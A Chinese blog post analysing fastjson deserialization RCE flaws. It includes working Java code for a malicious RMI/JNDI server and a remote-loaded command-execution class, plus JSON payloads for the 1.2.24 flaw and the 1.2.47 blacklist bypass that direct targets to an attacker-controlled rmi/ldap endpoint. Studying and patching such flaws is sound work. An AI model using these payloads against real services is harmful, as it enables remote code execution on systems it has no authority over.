---
title: fastjson反序列化漏洞分析
description: fastjson最新的反序列化漏洞和历史漏洞分析
categories:
 - 漏洞分析
tags:
 - 漏洞分析
---

这两年写了改了很多PoC，我们公司外网700多个服务，fastjson是我搞的这么多的PoC里唯一一个成功从外网RCE的漏洞，终于让我RCE了一次，开心的一匹

还能说什么呢，fastjson牛逼！！！

### 0x00 RMI-JNDI注入原理及利用
#### RMI和JNDI简介
没办法，别的分析文章里都是用RMI-JDNI的这条利用链的方式复现漏洞，不学也得学才能看懂

JNDI（Java Naming and Directory Interface,Java命名和目录接口）是一种Java的API，它允许客户端通过name发现和查找数据和对象

这些对象可以存储在不同的命名或者目录服务中，例如RMI（远程方法调用），LDAP（轻型目录访问协议）等

RMI（Remote Method Invocation，远程方法调用），名字看和RPC一样，是Java独有的机制，是让某个Java虚拟机上对象调用另一个Java虚拟机上对象的方法

RMI依赖的通信协议是JRMP（Java Remote Message Protocol，Java远程消息交换协议），为Java定制，服务端和客户端都为Java编写，RMI中对象是通过序列化的方式进行编码传输的

#### 先来弹一个计算器
注意，JDK版本在7u21以下，容易触发，因为RMI利用codebase执行任意代码的利用存在安全隐患，所以官方用SecurityManager和`java.rmi.server.useCodebaseOnly`进行了限制

使用低版本的JDK环境容易触发，避免学习时候造成的各种环境困境

首先建立一个目录，用IDEA创建一个Java项目，写几个Java类

```
// Client.java  客户端调用文件，也就是受害者服务器上的应用
import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://127.0.0.1:1099/test";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}

// Server.java  服务端调用文件，也就是攻击者提供的RMI服务
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference test = new Reference("Test", "Test", "http://127.0.0.1:8081/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(test);
        registry.bind("test", refObjWrapper);
    }
}
```

然后在另一个目录下用IDEA建立一个项目，写一个Java类，需要在另一个目录的原因是如果在同一目录下会直接从class文件中取类，不会远程加载

```
// Test.java  攻击者部署的文件，用来被加载引用
import java.io.*;

public class Test {
    public Test() throws IOException,InterruptedException{
        String cmd="open /System/Applications/Calculator.app";
        final Process process = Runtime.getRuntime().exec(cmd);
        printMessage(process.getInputStream());;
        printMessage(process.getErrorStream());
        int value=process.waitFor();
        System.out.println(value);
    }

    private static void printMessage(final InputStream input) {
        // TODO Auto-generated method stub
        new Thread (new Runnable() {
            @Override
            public void run() {
                // TODO Auto-generated method stub
                Reader reader =new InputStreamReader(input);
                BufferedReader bf = new BufferedReader(reader);
                String line = null;
                try {
                    while ((line=bf.readLine())!=null)
                    {
                        System.out.println(line);
                    }
                }catch (IOException e){
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
```

我们先运行直接IDEA运行Server.java

然后到`Test.java`的目录下，编译它，并且用打开Python简单的目录服务器提供文件查找服务

```
$ javac Test.java
$ ll
total 40
-rw-r--r--  1 milkfr  staff   944B Jan 14 17:10 Test$1.class
-rw-r--r--  1 milkfr  staff   996B Jan 14 17:10 Test.class
-rw-r--r--  1 milkfr  staff   1.1K Jan 14 17:10 Test.java
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

最后在IDEA运行Client.java

![0-1](https://milkfr.github.io/assets/images/posts/2019-07-22-analysis-java-deserialize-fastjson/0-1.png)

可以看到8081端口的文件被读取了，然后客户端也执行了弹计算器的代码

#### 调试调用链
调试调用链是为了帮我们有一些更加清晰认识

反正就是debug这个Client.java的代码，调试出大概这样一条调用链，这个链上没什么设计模式，比较容易调试和理解
```
getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)  // 判断class是本地还是codebase加载
getObjectInstance:319, NamingManager (javax.naming.spi)  // 判断是Reference进入到getObjectFactoryFromReference中
decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)  // 因为RMI绑定的是Reference对象，进入到NamingManager中
lookup:120, RegistryContext (com.sun.jndi.rmi.registry)  // 获取RMI服务IP地址等信息
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)  // 根据不同协议判断路线，这里是RMI路线
lookup:411, InitialContext (javax.naming)  // 重载封装一下GenericURLContext
main:11, Client
```

这里有一个codebase的概念，现在理解为本地没有class的话，从远程加载的一个机制就可以，详细还要其他再说

然后就加载了远程了class，执行代码，就造成了漏洞

上面这些说明只是方便我们理解

#### 引申的我们要用的调用链
把上面Client.java的代码该一下

```
import com.sun.rowset.JdbcRowSetImpl;

public class Client {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/test");
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}
```

运行一下，就会发现，还是会弹计算器，debug看调用栈，发现和上面除了一开始几乎一样

```
getObjectFactoryFromReference:142, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:411, InitialContext (javax.naming)
connect:643, JdbcRowSetImpl (com.sun.rowset)
setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)
main:14, Client
```

查看setAutoCommit和connect

```
public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    }
}
protected Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

可以看到connect中有`Context ctx = new InitialContext(); ctx.lookup(uri);`，相当于变相实现了最开始Client.java的使用

到这里基本对JNDI和RMI这个利用链有一个认识，大概知道原因就好，我们说反序列化漏洞研究既要看组件本身，gadget也是很重要的一点，所以要先说明这个，等下就会发现，理解了这个gadget，fastjson反序列化漏洞也理解了大半，之后的一些其他利用链和绕过就很容易理解了

### 0x02 fastjson使用和`@type`的问题
#### 两个例子
简单写两个例子

第一个

```
// Person.java
public class Person {
    public String name;
    public int age;

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}

// 应用处
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class aaa {
    public static void main(String[] args) {
        Person person = new Person();
        person.name = "test";
        person.age = 18;

        String a = JSONObject.toJSONString(person);
        String b = JSONObject.toJSONString(person, SerializerFeature.WriteClassName);

        System.out.println(a);
        System.out.println(b);

        Object pa = JSON.parse(a);
        Object pb = JSON.parse(b);
        System.out.println(pa.getClass().getName() + " " + pa);
        System.out.println(pb.getClass().getName() + " " + pb);
    }
}
```

输出为

```
{"age":18,"name":"test"}
{"@type":"Person","age":18,"name":"test"}
com.alibaba.fastjson.JSONObject {"name":"test","age":18}
Person Person{name='test', age=18}
```

这里可以得知，有`@type`关键字的，可以直接转换为Java类，不然是`JSONObject`，大概就是`@type`是用来指定解析的类的

第二个例子

```
// Person.java
import java.util.Properties;

public class Person {
    public String name;
    public String age;

    public Person() {
    }

    public void setName(String name) {
        System.out.println("set name");
        this.name = name;
    }

    public void setAge(String age) {
        System.out.println("set age");
        this.age = age;
    }

    public String getName() {
        System.out.println("get name");
        return name;
    }

    public String getAge() {
        System.out.println("get age");
        return age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age='" + age + '\'' +
                '}';
    }
}

// 应用处
import com.alibaba.fastjson.JSON;

public class aaa {
    public static void main(String[] args) {
        String eneity = "{\"@type\":\"Person\", \"name\":\"lala\", \"age\": 13}";
        Object obj = JSON.parse(eneity);
        System.out.println(obj);
        String eneity2 = "{\"name\":\"lala\", \"age\": 13}";
        Object obj2 = JSON.parse(eneity2);
        System.out.println(obj2);
    }
}
```

输出为

```
set name
set age
Person{name='lala', age='13'}
{"age":13,"name":"lala"}
```

也就是有`@type`关键字时会调用set方法

也有很多文章说会调用get、is等方法，实际上我没遇到，还说这种调用有对类型的判断会导致不同，我试了文章提供了例子也不行

#### 无意义地单步调试几千下
然后为了大概了解，我们就可以单步调试了，因为涉及到解析引擎，总之很复杂，还存在bytecode找不到到情况，为了不漏过任何一个调用，反正点step over几千下就是了，直到console输出到上一步，打上断点再来一边，最后到调用处和调用堆栈是这样到

![2-1](https://milkfr.github.io/assets/images/posts/2019-07-22-analysis-java-deserialize-fastjson/2-1.png)

总之还是用了反射，获取了set方法，调用了，然后有没有`@type`的判断在`parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser)`中

其实只要知道了有了`@type`会调用set方法就可以，其实整个过程涉及到很多解析，能完全看懂太难了

### 0x03 1.2.24版本fastjson漏洞
有了上面两项分析，RMI-JNDI注入和`@type`，然后写一个PoC，就马上能理解这个版本到漏洞在哪里了

```
import com.alibaba.fastjson.JSON;

public class Payload {
    public static void main(String[] args) {
        String aa =   "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/test\",\"autoCommit\":true}";
        JSON.parse(aa);
    }
}
```

我们之前讲到，RMI-JNDI到利用是这样到

```
JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/test");
JdbcRowSetImpl_inc.setAutoCommit(true);
```

然后fastjson会有`@type`的情况下会调用set方法，所以会调用`setDataSourceName`和`setAutoCommit`，然后就进入到了RMI-JNDI的利用链中

然后1.2.24版本的fastjson漏洞就是这么简单

1.2.24版本之后加入了`checkAutoType`函数，用黑名单的方式检查`@type`指定的类

### 0x04 1.2.47版本fastjson漏洞
然后就是这唯一可以打公司外网RCE成功的现在这个通杀绕过`@type`检查的RCE了

```
public class Payload {
    public static void main(String[] args) {
        String aa =   "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/test\",\"autoCommit\":true}}}";
        JSON.parse(aa);
    }
}
```

PoC特写

```
{
    "a": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://localhost:1389/Exploit",
        "autoCommit": true
    }
}
```

可以看到，PoC分两个部分，第二部分和之前的PoC其实是一样的，所以利用链也一样，那剩下的肯定是绕过用的

然后我们看看是怎么绕过的，主要看两个地方，调用栈和调试信息如下图

![4-1](https://milkfr.github.io/assets/images/posts/2019-07-22-analysis-java-deserialize-fastjson/4-1.png)

![4-2](https://milkfr.github.io/assets/images/posts/2019-07-22-analysis-java-deserialize-fastjson/4-2.png)

然后是在`loadClass`的过程中，因为`cache`变量默认为`true`，所以把`com.sun.rowset.JdbcRowSetImpl`放入了`mappings`中

然后`@type`为`com.sun.rowset.JdbcRowSetImpl`时候的`checkAutoType`因为可以从`mappings`里获取到`com.sun.rowset.JdbcRowSetImpl`就不验证黑名单黑名单，绕过检测

### 0x05 fastjson漏洞的修复
有意思的是，这次风风雨雨的fastjson漏洞，网上开始说的是fastjson的0day，开始觉得是通杀到1.2.58版本的，然后实际检测下来，我自己公司700多站点也只有1个RCE，但是业务也是主要业务了，因为其实只影响到1.2.47版本，而且我们的业务其实很少用到`@type`，所以只有这个有些重要的老项目在这个版本里

慢慢拨开迷雾，了解到网上传1.2.49版本的更新才有增加安全防护的字眼，然后安全圈就开始在49前的版本开始找问题，然后在testcase里找到了，然后就是PoC盛行

其实这里有一点是从最开始的fastjson漏洞开始，WAF拦的应该就是`@type`关键字，也就是有好的WAF的话影响不大，我这次RCE的业务也有WAF，但是成功了，说明WAF又部署失效了，真的是容不得一点懈怠

还有意思的是这个项目[fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)

fastjson黑名单的类hash过了，那就把所有公共类hash一下比对，实际上没有增加什么保密性，但是还是有些类没有还原出来

然后是整个fastjson漏洞的修复历史和绕过历史，我看过两片文章很好，推荐一下

[浅谈Fastjson RCE漏洞的绕过史](https://www.freebuf.com/vuls/208339.html)：平安银行应用安全团队很强，每次都全版本分析一些漏洞，很有实力，一点不像银行

[JAVAfan序列化——FastJson组件](https://xz.aliyun.com/t/7027)：这片先知的文章也写得很详细

